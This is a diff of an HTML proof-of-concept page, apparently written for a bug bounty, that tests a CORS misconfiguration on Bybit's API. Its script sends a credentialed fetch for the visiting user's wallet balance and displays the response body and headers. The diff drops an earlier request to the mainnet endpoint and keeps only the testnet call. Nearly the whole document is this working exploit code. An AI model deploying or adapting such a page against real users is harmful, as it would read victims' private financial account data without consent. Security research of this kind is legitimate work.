@@ -3,33 +3,28 @@
 <head><title>Bybit CORS PoC</title></head>
 <body>
 <h2>Bybit CORS PoC — darivxe</h2>
-<p><strong>Testnet wallet balance (api-testnet.bybit.com):</strong></p>
+<p><strong>Testnet raw response:</strong></p>
 <pre id="testnet-out">fetching...</pre>
-<p><strong>Mainnet wallet balance (api.bybit.com):</strong></p>
-<pre id="mainnet-out">fetching...</pre>
+<p><strong>Testnet response headers:</strong></p>
+<pre id="testnet-headers">fetching...</pre>
 
 <script>
-const timestamp = Date.now();
-
-// Testnet
 fetch("https://api-testnet.bybit.com/v5/account/wallet-balance?accountType=UNIFIED", {
   credentials: "include"
 })
-.then(r => r.json())
+.then(r => {
+  // capture headers
+  let hdrs = "";
+  r.headers.forEach((v, k) => hdrs += k + ": " + v + "\n");
+  document.getElementById("testnet-headers").textContent = hdrs;
+  return r.text();
+})
 .then(data => {
-  document.getElementById("testnet-out").textContent = JSON.stringify(data, null, 2);
+  document.getElementById("testnet-out").textContent = data || "(empty body)";
 })
-.catch(e => document.getElementById("testnet-out").textContent = "Error: " + e);
-
-// Mainnet
-fetch("https://api.bybit.com/v5/account/wallet-balance?accountType=UNIFIED", {
-  credentials: "include"
-})
-.then(r => r.json())
-.then(data => {
-  document.getElementById("mainnet-out").textContent = JSON.stringify(data, null, 2);
-})
-.catch(e => document.getElementById("mainnet-out").textContent = "Error: " + e);
+.catch(e => {
+  document.getElementById("testnet-out").textContent = "CORS blocked or error: " + e;
+});
 </script>
 </body>
 </html>
